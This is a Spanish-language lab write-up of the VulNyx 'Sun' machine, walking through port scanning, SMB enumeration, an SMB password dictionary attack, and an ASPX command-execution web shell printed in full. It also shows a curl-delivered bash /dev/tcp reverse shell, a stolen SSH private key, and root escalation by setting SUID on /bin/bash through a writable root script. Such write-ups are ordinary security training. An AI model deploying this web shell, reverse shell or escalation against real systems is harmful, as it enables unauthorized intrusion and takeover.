# WRITEUP - SUN - VULNYX #
![image](https://github.com/AlexGis99/Writeups/assets/82893511/6a02358e-2d01-4b51-805f-a652302827a1)
### Recon/Scanning network: ###
**Antes de empezar, se tuvo que cambiar el direccionamiento IP a la mitad de la intrusión por temas de conexión entre VMs, por lo que ___10.0.2.5=192.168.1.13___**  
Empezamos con un escaneo de la red para averiguar el direccionamiento ip de la máquina víctima:
```console
$ netdiscover -r 10.0.2.0/24
```
Una vez identificado la ip de la máquina víctima, en mi caso la 10.0.2.5, procedemos a realizar un pequeño escaneo para conocer qué puertos tiene abiertos. Este primer escaneo queremos que sea lo más rápido y fiable posible. En este escaneo solo nos indica aquellos que estén abiertos, se realiza sobre los 65535 puertos que tiene (total), con un ratio mínimo de 5000 paquetes por segundo, no realice resolución DNS y skipear host discovery:
```console
$ nmap --open -p- --min-rate 5000 -n -Pn 10.0.2.5
```
```console
# Nmap 7.94SVN scan initiated Wed Apr  3 15:31:08 2024 as: nmap --open -p- --min-rate 5000 -n -Pn -vvv -oN nmap/scan 192.168.1.13
Nmap scan report for 192.168.1.13
Host is up, received user-set (0.016s latency).
Scanned at 2024-04-03 15:31:08 EDT for 66s
Not shown: 55667 filtered tcp ports (no-response), 9863 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
139/tcp  open  netbios-ssn  syn-ack ttl 64
445/tcp  open  microsoft-ds syn-ack ttl 64
8080/tcp open  http-proxy   syn-ack ttl 64

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Apr  3 15:32:14 2024 -- 1 IP address (1 host up) scanned in 66.29 seconds
```
[First scan](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/nmap/scan)  
Revisando la salida, podemos identificar los puertos:
* SSH ports: 22
* HTTP ports: 80, 8080  
* SMB ports: 445  
* NetBIOS ports: 139  
Al ver esto, podemos realizar un escaneo para enumerar servicios:
```console
$ nmap -p22,80,8080,445,139 -sVC 10.0.2.5
```
```console
# Nmap 7.94SVN scan initiated Wed Apr  3 15:42:40 2024 as: nmap -sVC -p22,80,8080,139,445 -oN nmap/scan-services 192.168.1.13
Nmap scan report for sun.home (192.168.1.13)
Host is up (0.0030s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-title: Sun
|_http-server-header: nginx/1.22.1
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        nginx 1.22.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Sun
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SUN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-04-03T19:42:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  3 15:43:06 2024 -- 1 IP address (1 host up) scanned in 26.17 seconds
```
[Scan services](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/nmap/scan-services)  
## Enumeration
Una vez realizados los escaneos procedemos a enumerar los servicios. Para esto haremos uso de los scripts de nmap y mientras están enumerando posibles usuarios, dominios, directorios y demás, le echaremos un vistazo a los servicios HTTP.
```console
$ nmap -p139 --script nbstat.nse 10.0.2.5
```
```console
# Nmap 7.94SVN scan initiated Wed Apr  3 15:58:20 2024 as: nmap --script nbstat -oN nmap/scan-nbstat 192.168.1.13
Nmap scan report for sun.home (192.168.1.13)
Host is up (0.0011s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Host script results:
| nbstat: NetBIOS name: SUN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SUN<00>              Flags: <unique><active>
|   SUN<03>              Flags: <unique><active>
|   SUN<20>              Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>

# Nmap done at Wed Apr  3 15:58:26 2024 -- 1 IP address (1 host up) scanned in 5.59 seconds
```
[Nbstat result](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/nmap/scan-nbstat)  
Procedemos con enumerar samba. Primero intentamos entrar de forma directa con un usuario NULL y listar shares:
```console
$ smbclient -L //10.0.2.4/ -U "" -N
```
```console

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
	nobody          Disk      File Upload Path
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 192.168.1.13 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
[Enum users SMB](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/smbclient_enum)  
Podemos identificar un usuario "nobody" el cual tiene en la descripción de "disk": "file upload path". Esto puede ser un posible vector de entrada para insertar un fichero y realizar un RCE (Remote Command Execution). Procedemos a enumerar más a fondo SMB con enum4linux:
```console
$ enum4linux -P 10.0.2.5
```
```console
+] Password Info for Domain: SUN

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes
```
[Enum password policy](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/passwordPolicy)  
```console
$ enum4linux -R 10.0.2.5
```
```console
S-1-22-1-1000 Unix User\punt4n0 (Local User)

[+] Enumerating users using SID S-1-5-21-3376172362-2708036654-1072164461 and logon username '', password ''

S-1-5-21-3376172362-2708036654-1072164461-501 SUN\nobody (Local User)
S-1-5-21-3376172362-2708036654-1072164461-513 SUN\None (Domain Group)
S-1-5-21-3376172362-2708036654-1072164461-1000 SUN\punt4n0 (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
```
[enum4linux enum users](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/enumeration/enum4linux_enum)  
Podemos enumerar la página web e intentar analizarla viendo el código html de la página, pero no nos dará muchas pistas y es malgastar tiempo.
### Weaponization ###
Observamos un usuario llamado "punt4n0", sabiendo esto y que la política de complejidad de contraseña es muy débil podemos intentar un ataque de diccionario por SMB. Al no haber podido realizar esto con Hydra (debido a que no soporta SMBv1), nos creamos un pequeño script en bash para realizar este ataque: [Script bash dictionary attack](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/scripts/dictionaryAtt_smb.sh)
El script nos devuelve una contraseña: "sunday". En este caso hemos creado un script muy sencillo de bash que nos ha funcionado en poco tiempo, en caso de que esto se fuese de tiempo, tendríamos que agilizar la ejecución utilizando varios hilos o procesos.  
Ya que tenemos la contraseña, podemos entrar en la máquina con SMB o para hacerlo más sencillo y cómodo, podemos montarnos una partición con el share del usuario:
```console
$ mkdir /mnt/Sun
$ mount -t cifs -o user=punt4n0 -o password=sunday //10.0.2.5/punt4n0 /mnt/Sun
```
### Gaining access/Explotation ###
Analizando el share que nos hemos montado en nuestra partición, observamos que tiene la misma estructura que el servicio web, por lo que podemos crear reverse shells o una ejecución de RCE y probar a explotarlo vía el servicio web. Probamos con diferentes webshells y en una de las peticiones, podemos ver que lo que se está ejecutando internamente es ASP.NET, por lo que ahora sí podemos crear una webshell/script en aspx, para poder vulnerar el servicio de forma correcta.
[Different webshells](https://github.com/AlexGis99/Writeups/tree/main/Vulnyx/Sun/scripts)
En mi caso funcionó un pequeño script que nos permite ejecutar un RCE mediante: "url?cmd=\<command\>". [RCE script aspx](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/scripts/last_reverse_shell.aspx) 
```console
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">

protected void Page_Load(object sender, EventArgs e)
{
    string reverse = Request["cmd"];
    
    if (!string.IsNullOrEmpty(reverse))
    {
        ExecuteCommand(reverse);
    }
}

private void ExecuteCommand(string command)
{
    try
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "/bin/bash";
        proc.StartInfo.Arguments = "-c \"" + command + "\"";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        
        string output = proc.StandardOutput.ReadToEnd();
        Response.Write(output);
        proc.WaitForExit();
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
}

</script>
```
Ejecutamos un comando como whoami para ver la respuesta del servidor:
```console
$ curl http://10.0.2.5:8080/last_reverse_shell.aspx?cmd=whoami
```
![image](https://github.com/AlexGis99/Writeups/assets/82893511/c7e4f8f6-b171-4fe1-acda-bcabf0f1ddc5)
Tenemos respuesta del servicio por lo que hemos conseguido vulnerarlo a través de un RCE. Para un tratamiento más cómodo, nos enviamos una reverse shell a un puerto que dejaremos en escucha (443 por ejemplo):
```console
$ nc -nlvp 443
```
Nos mandamos la reverse shell:
```console
$ curl http://10.0.2.5:8080/last_reverse_shell.aspx?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.5%2F443%200%3E%261
```
De esta forma recibimos la shell y podemos empezar con el proceso de obtención de las flags. Antes del siguiente apartado, podemos hacer un tratamiento de la shell para así poder enviar señales cómo ctrl+c, ctrl+z... y no perder la shell:
```console
$ script /dev/null -c bash
$ ctrl+z
$ stty raw -echo;fg
$ reset xterm
$ export TERM=xterm
$ export SHELL=bash
```
Ahora obtenemos una shell en condiciones y podemos proceder con el siguiente apartado. Recorremos el home del usuario y podemos visualizar la flag: [punt4n0 flag](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/flags/user.txt). Probamos lo mismo con el home de root, pero no tenemos permisos.
### Persistence/Maintaing access ###
Debido a que no tenemos un acceso "limpio" a la máquina, debemos comprometer la contraseña del usuario del sistema o acceder mediante clave pública. Buscando sobre el directorio home del usuario nos encontramos con un archivo que se llama "remember_password". Dentro de este archivo vemos una posible contraseña, por lo que probamos a entrar por ssh pero la máquina tiene restringido este acceso y nosotros como punt4n0 no tenemos permisos de modificar el archivo de configuración de ssh. Pero, nos encontramos con un directorio oculto llamado ".ssh" el cual dentro, tiene una clave privada RSA que podemos intentar utilizar para acceder por ssh. Nos copiamos la clave en nuestra máquina y la guardamos en un archivo: [id_rsa](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/contents/id_rsa).  
```console
$ ssh -i id_rsa punt4n0@10.0.2.5
```
![image](https://github.com/AlexGis99/Writeups/assets/82893511/d158d46a-2362-4ec9-9a2f-f73b1bd9779a)
Nos pide un passphrase, que si recordamos, podría ser la contraseña que obtuvimos del archivo de "remember_password", por lo que la introducimos y hemos obtenido acceso por ssh. Ahora podemos acceder cuándo queramos con un acceso más "limpio" que una reverse shell.
### Privilege escalation ###
Empezamos esta fase identificando los permisos que tenemos sobre sudo, pero vemos que ni siquiera lo tiene.
Identificamos a los grupos a los que está integrado nuestro usuario:
```console
$ id
```

Analizamos los ficheros con permisos SUID/SGUID en la máquina (permisos que permiten ejecutar el fichero como root).
```console
$ find / -perm /6000
```
No encontramos ninguno singular que nos permita vulnerar la máquina. De todas formas, al no poder utilizar sudo, poco podríamos hacer en este caso de forma directa.
Pasamos a identificar aquellos procesos cron que se puedan estar utilizando:
```console
$ crontab -l
```
```console
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
@reboot /usr/bin/fastcgi-mono-server4 /applications=/:/var/www/aspnet /socket=tcp:127.0.0.1:9000
```
Vemos en [crontab](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/contents/crontab) que existe un proceso que se ejecuta cada vez que se reinicia la máquina. Por mucho que indaguemos dentro de este proceso, no parece haber manera de vulnerarlo.
Pasamos a ver si hay procesos en ejecución que nos permita determinar una posible ejecución a la que vulnerar, pero no encontramos gran cosa (aparentemente).
Podemos buscar dentro de los directorios del servicio web, pero no encontraremos ningún indicio de password o ejecución a la que poder explotar.
Rebuscando en directorios como /tmp, /dev/shm y /opt, nos encontramos con un script en powershell (aparentemente) y vemos que nuestro usuario tiene permisos de lectura y escritura sobre el fichero, por lo que procedemos a abrirlo y determinar qué hace. El script simplemente ejecuta un $(id) en el fichero /dev/shm/out. Analizando este fichero, vemos que el que ejecuta el script es root (UID 0) y que se ejecuta de forma recurrente. Esto hace que podamos introducir cualquier código malicioso en bash y que root lo ejecute. Hay diferentes formas de escalar a root pero en este caso vamos a añadirle permisos de SUID a /bin/bash para poder ejecutar una bash como root desde nuestro usuario sin privilegios. Para esto añadimos dentro del script:
```console
$ chmod u+s /bin/bash
```
Esperamos hasta que se ejecute el script y cambie los permisos en el binario. Una vez se haya ejecutado simplemente ejecutamos:
```console
$ bash -p
```
Listo, tenemos acceso como root. Dentro del directorio home de root, encontramos la flag que nos faltaba: [root flag](https://github.com/AlexGis99/Writeups/blob/main/Vulnyx/Sun/flags/root.txt)

